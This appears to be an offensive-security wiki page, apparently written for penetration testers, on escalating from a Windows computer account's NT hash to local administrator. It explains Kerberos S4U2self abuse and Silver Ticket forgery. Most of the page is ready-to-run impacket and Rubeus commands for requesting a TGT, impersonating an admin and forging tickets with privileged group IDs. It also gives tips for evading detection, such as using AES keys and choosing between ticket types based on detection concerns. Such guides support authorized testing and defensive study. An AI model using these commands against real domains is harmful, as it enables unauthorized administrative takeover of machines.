**Machine account to local admin (S4U2self)** — you hold a workstation's *computer account* password or NT hash but have no admin rights anywhere; this turns that into full admin on the same box. It works because Kerberos lets an account ask the domain's login server (the KDC) for a service ticket *to itself* while impersonating another user — a feature called S4U2self. Mechanically: grab a TGT (the domain's master login ticket) for the machine account, run S4U2self to mint a ticket to the box impersonating a real local admin, and swap the service class to `cifs` so you can execute commands. Because the KDC issues that ticket with a genuine PAC (the part of a Kerberos ticket that lists your group memberships), it is stealthier than forging a Silver Ticket.

```
you (machine hash) -> KDC: ask for the machine's TGT
KDC -> you: machine TGT
you -> KDC: S4U2self, impersonate Admin, service=cifs
KDC -> you: service ticket to the box as Admin
you -> target (cifs): run commands as Admin
```

**Note:** Computer accounts have **no** admin privileges of their own - they behave like ordinary domain users. This technique does not use the machine account's *own* rights; it impersonates a *different* user who has admin rights on the box.
## Prerequisites

- **Coerce + crack (NTLMv1)** - force the machine to authenticate to you, capture NetNTLMv1, crack it to the machine's NT hash. No prior access to the box. See [NTLMv1 Authentication Downgrade](../Coercion/NTLMv1%20Authentication%20Downgrade.md).
- **Machine password recovered elsewhere** - a machine account password/hash found in shares, backups, GPP, or another host's memory (a host is not local admin on *itself* by default, so this is not automatically circular).

**Persistence:** if you obtained the hash by dumping *that machine's* own SAM/LSA/LSASS, you were already admin - use it for persistence/re-entry, not to "get" admin you already have.

## Exploitation

**Key requirement:** the user you impersonate must actually be a **local admin on the target**.

### Method 1: S4U2self (preferred - legitimate PAC)

Stealthier than a Silver Ticket: the ticket is issued by the KDC and carries a **legitimate PAC**, so it is not a forgery.

**From Linux (impacket):**

```bash

# Request a TGT for the machine account (RC4/NT hash shown; use -aesKey if RC4 is disabled)
getTGT.py -dc-ip 'DC_IP' -hashes ':TARGET_NT_HASH' 'DOMAIN/COMPUTER_NAME$'
# S4U2self to ourselves, impersonating an admin, and swap the service to cifs
export KRB5CCNAME='COMPUTER_NAME$.ccache'
getST.py -self -impersonate 'ADM_NAME' -altservice 'cifs/COMPUTER_FQDN' -k -no-pass -dc-ip 'DC_IP' 'DOMAIN/COMPUTER_NAME$'

```

**From Windows (Rubeus):**

```powershell

# /self performs S4U2self; get the machine TGT first (here via a cert; a hash/password also works)
.\Rubeus.exe asktgt /user:COMPUTER_NAME$ /rc4:TARGET_NT_HASH /nowrap
.\Rubeus.exe s4u /self /impersonateuser:ADM_NAME /service:host/COMPUTER_FQDN /altservice:cifs/COMPUTER_FQDN /ticket:$T /ptt

```

**Note:** S4U2self can impersonate a user even if it is marked "sensitive / cannot be delegated" or is in the **Protected Users** group.

**Note:** `The specified I/O request packet (IRP) cannot be disposed of ...` when using the ticket does not always mean it is invalid - it can appear if you did not authenticate as the account named in the SPN.

### Method 2: Silver Ticket (forged, offline)

With the machine key you can forge the Service Ticket directly - no DC contact, works offline, but the PAC is forged (noisier if PAC validation is enforced).

```bash

ticketer.py -nthash 'TARGET_NT_HASH' -domain-sid 'DOMAIN_SID' -domain 'DOMAIN' -spn 'cifs/TARGET_FQDN' -groups '512,513,518,519,520' 'ADM_NAME'

```

Groups baked into the ticket: **512** Domain Admins, **513** Domain Users, **518** Schema Admins, **519** Enterprise Admins, **520** Group Policy Creator Owners. Add more if the tiering model requires it.

### Use the Service Ticket

Use the resulting ticket to execute commands on the target - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

- **RC4 vs AES:** `-hashes`/`/rc4` use RC4 (noisier, and fails where RC4 is disabled). Prefer the AES key (`-aesKey` / `/aes256`) when available - stealthier and required in AES-only domains.
- **S4U2self vs Silver Ticket:** S4U2self tickets are KDC-issued with a valid PAC (harder to detect); Silver Tickets are forged offline (no DC contact, but flagged if PAC validation is on). Choose per your detection concerns.
- Note any forged/injected tickets (they live in memory / a ccache) in the report.

## References

- The Hacker Recipes - S4U2self abuse - https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse
- Elad Shamir - Wagging the Dog - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- Impacket - https://github.com/fortra/impacket
- Rubeus - https://github.com/GhostPack/Rubeus
